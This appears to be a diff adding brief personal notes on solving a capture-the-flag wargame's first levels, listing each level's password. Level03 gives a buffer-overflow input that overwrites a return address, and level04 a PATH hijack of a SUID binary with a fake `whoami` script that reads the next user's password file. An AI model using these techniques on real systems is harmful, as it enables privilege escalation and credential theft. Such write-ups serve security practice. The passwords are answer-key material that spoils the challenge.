@@ -1,0 +1,38 @@
+# vim: ts=2 sw=2 et ai
+#
+level01 -> XNWFtWKWHhaaXoKI
+  > 271
+  It is doing a jmp comparison against 0x10f, which is 271.
+
+
+level02 -> OlhCmdZKbuzqngfz
+  > -14294967296 -1
+
+  TODO:  I need to add an explanation.
+
+
+level03 -> 7WhHa5HWMNRAYl9T
+  > 0000000000000000000000000000000000000000000000000000000000000000000000000000$(printf '\x74\x84\x04\x08')
+
+  Address of `good` is @ 08048474, in hex.  Now, we want to craft the
+    \x74\x84\x04\x08
+
+  I simply added noise until the program segfaulted with a bad address, that was 76 long,
+  the resulting address is:
+
+level04 -> DNLM3Vu0mZfX0pDd
+  >
+
+  The binary has SUID permissions:
+  -r-sr-x--- 1 level5 level4 5159 Dec 18  2013 level04
+
+  So, the trick is to replace the `whoami` program which is fake.
+
+  ```
+  #!/bin/bash
+  cat /home/level5/.pass
+  ```
+
+  Then export the `PATH` such that it's `export PATH=/tmp:${PATH}`
+
+level05 ->
